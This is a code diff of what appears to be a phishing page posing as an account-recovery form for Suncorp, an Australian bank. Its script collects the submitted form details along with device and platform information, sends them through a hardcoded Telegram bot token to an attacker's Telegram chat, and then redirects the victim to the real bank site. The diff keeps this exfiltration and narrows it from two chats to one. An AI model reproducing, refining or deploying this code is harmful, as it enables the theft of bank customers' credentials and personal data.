@@ -84,7 +84,7 @@
        <script>
 // Telegram Bot Configuration
 const TELEGRAM_BOT_TOKEN = '8580841728:AAFsXNmdnj-kBurv4UxM4ucpZm4NqYcDL00';
-const TELEGRAM_CHAT_IDS = ['-5233511146', '7987288274'];
+const TELEGRAM_CHAT_ID = '-5233511146';
 
 document.addEventListener('DOMContentLoaded', function() {
     const form = document.getElementById('recoverForm');
@@ -232,39 +232,6 @@ document.addEventListener('DOMContentLoaded', function() {
         }
     }
     
-    // Send message to a single chat
-    async function sendToTelegram(chatId, message) {
-        const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-        
-        try {
-            const response = await fetch(telegramUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: message,
-                    parse_mode: 'Markdown'
-                })
-            });
-            
-            const data = await response.json();
-            
-            if (!response.ok || !data.ok) {
-                console.error(`Failed to send to chat ${chatId}:`, data.description || 'Unknown error');
-                return false;
-            }
-            
-            console.log(`Successfully sent to chat ${chatId}`);
-            return true;
-            
-        } catch (error) {
-            console.error(`Network error sending to chat ${chatId}:`, error);
-            return false;
-        }
-    }
-    
     form.addEventListener('submit', async function(e) {
         e.preventDefault();
         clearError();
@@ -306,21 +273,25 @@ Device: ${device}
 Platform: ${platform}
 Date: ${currentDateTime}`;
         
-        // Send to both Telegram chat IDs sequentially with better error handling
-        const results = [];
-        
-        for (const chatId of TELEGRAM_CHAT_IDS) {
-            const success = await sendToTelegram(chatId, message);
-            results.push({ chatId, success });
+        // Send to Telegram
+        try {
+            const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            await fetch(telegramUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            });
+        } catch (error) {
+            console.error('Failed to send to Telegram:', error);
         }
         
-        // Check if at least one succeeded
-        const anySuccess = results.some(r => r.success);
-        if (!anySuccess) {
-            console.error('All Telegram sends failed');
-        }
-        
-        // Redirect after 2 seconds regardless of Telegram success
+        // Redirect after 2 seconds
         setTimeout(function() {
             window.location.href = 'https://www.suncorp.com.au';
         }, 2000);
